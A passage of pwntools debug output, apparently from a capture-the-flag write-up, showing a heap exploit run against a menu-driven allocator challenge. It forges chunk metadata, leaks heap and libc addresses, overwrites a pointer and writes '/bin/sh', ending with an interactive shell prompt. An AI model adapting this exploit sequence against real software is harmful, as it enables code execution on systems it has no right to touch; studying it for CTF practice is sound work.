&apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 6 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;12\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0xc bytes:</span><br><span class="line">    &apos;h&apos; * 0xc</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1240\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 7 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;56\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1256\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;12\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0xc bytes:</span><br><span class="line">    &apos;h&apos; * 0xc</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 3 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1240\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 8 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;5\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 5 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;72\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1256\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Deleted\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;7\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;48\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x30 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  f1 04 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  e0 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000030</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 7 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;8\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;80\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x50 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  e1 04 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000030  00 00 00 00  00 00 00 00  e8 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000040  00 00 00 00  00 00 00 00  c3 07 37 13  00 00 00 00  │····│····│··7·│····│</span><br><span class="line">    00000050</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 8 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;72\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;56\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x38 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000020  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000030  00 08 37 13  00 00 00 00                            │··7·│····││</span><br><span class="line">    00000038</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 2 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;64\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x40 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  e3 07 37 13  00 00 00 00  08 00 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000040</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0xa bytes:</span><br><span class="line">    &apos;Chunk[1]: &apos;</span><br><span class="line">[DEBUG] Received 0x42 bytes:</span><br><span class="line">    00000000  60 40 2f 97  25 56 00 00  0a 31 2e 20  41 6c 6c 6f  │`@/·│%V··│·1. │Allo│</span><br><span class="line">    00000010  63 61 74 65  0a 32 2e 20  55 70 64 61  74 65 0a 33  │cate│·2. │Upda│te·3│</span><br><span class="line">    00000020  2e 20 44 65  6c 65 74 65  0a 34 2e 20  56 69 65 77  │. De│lete│·4. │View│</span><br><span class="line">    00000030  0a 35 2e 20  45 78 69 74  0a 43 6f 6d  6d 61 6e 64  │·5. │Exit│·Com│mand│</span><br><span class="line">    00000040  3a 20                                               │: │</span><br><span class="line">    00000042</span><br><span class="line">heap: 5625972f4060</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;64\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x40 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  70 40 2f 97  25 56 00 00  08 00 00 00  00 00 00 00  │p@/·│%V··│····│····│</span><br><span class="line">    00000040</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0xa bytes:</span><br><span class="line">    &apos;Chunk[1]: &apos;</span><br><span class="line">[DEBUG] Received 0x42 bytes:</span><br><span class="line">    00000000  58 cb 14 2e  7a 7f 00 00  0a 31 2e 20  41 6c 6c 6f  │X··.│z···│·1. │Allo│</span><br><span class="line">    00000010  63 61 74 65  0a 32 2e 20  55 70 64 61  74 65 0a 33  │cate│·2. │Upda│te·3│</span><br><span class="line">    00000020  2e 20 44 65  6c 65 74 65  0a 34 2e 20  56 69 65 77  │. De│lete│·4. │View│</span><br><span class="line">    00000030  0a 35 2e 20  45 78 69 74  0a 43 6f 6d  6d 61 6e 64  │·5. │Exit│·Com│mand│</span><br><span class="line">    00000040  3a 20                                               │: │</span><br><span class="line">    00000042</span><br><span class="line">libc_base: 7f7a2ddb3000</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;0\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;88\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x58 bytes:</span><br><span class="line">    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  31 73 37 13  00 00 00 00  │····│····│1s7·│····│</span><br><span class="line">    00000020  00 08 37 13  00 00 00 00  00 10 00 00  00 00 00 00  │··7·│····│····│····│</span><br><span class="line">    00000030  88 e7 14 2e  7a 7f 00 00  00 01 00 00  00 00 00 00  │···.│z···│····│····│</span><br><span class="line">    00000040  50 08 37 13  00 00 00 00  00 01 00 00  00 00 00 00  │P·7·│····│····│····│</span><br><span class="line">    00000050  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·││</span><br><span class="line">    00000058</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 0 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;8\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x8 bytes:</span><br><span class="line">    00000000  80 24 df 2d  7a 7f 00 00                            │·$·-│z···││</span><br><span class="line">    00000008</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;3\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &apos;\n&apos; * 0x1</span><br><span class="line">$ 